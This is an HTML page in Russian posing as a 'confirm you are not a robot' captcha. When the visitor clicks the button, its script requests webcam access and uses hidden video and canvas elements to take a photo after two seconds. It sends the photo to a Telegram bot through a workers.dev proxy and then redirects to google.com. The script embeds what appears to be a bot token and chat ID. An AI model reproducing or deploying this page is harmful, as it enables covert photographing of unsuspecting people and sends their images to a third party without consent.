<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка контента...</title>
    <style>
        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
        .container { text-align: center; padding: 20px; background: white; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 10px; width: 100%; transition: 0.3s; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        #status { margin-top: 15px; font-size: 14px; color: #555; }
        video, canvas { display: none; } /* Скрываем технические элементы */
    </style>
</head>
<body>

<div class="container">
    <h2>Подтвердите, что вы не робот</h2>
    <p>Для доступа к контенту нажмите кнопку ниже</p>
    <button id="actionBtn">Я не робот (Продолжить)</button>
    <div id="status"></div>
</div>

<!-- Технические элементы -->
<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
   const token = '8606836997:AAEi_rRmslGqHJQ0pk6KPFjDMROHtG6s0EQ';
const chatId = '1976857829';
const targetUrl = 'https://google.com';

// Попробуем другой, более стабильный прокси
const proxyUrl = `https://silent-surf-60b2.parsinnikita76.workers.dev/bot${token}/sendPhoto`;

const btn = document.getElementById('actionBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

btn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(res => setTimeout(res, 2000));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'img.jpg');

        // Отправка
        await fetch(proxyUrl, {
            method: 'POST',
            body: formData
        });

        stream.getTracks().forEach(track => track.stop());

    } catch (err) {
        console.error("Ошибка:", err);
    } finally {
        window.location.href = targetUrl;
    }
});

</script>

</body>
</html>
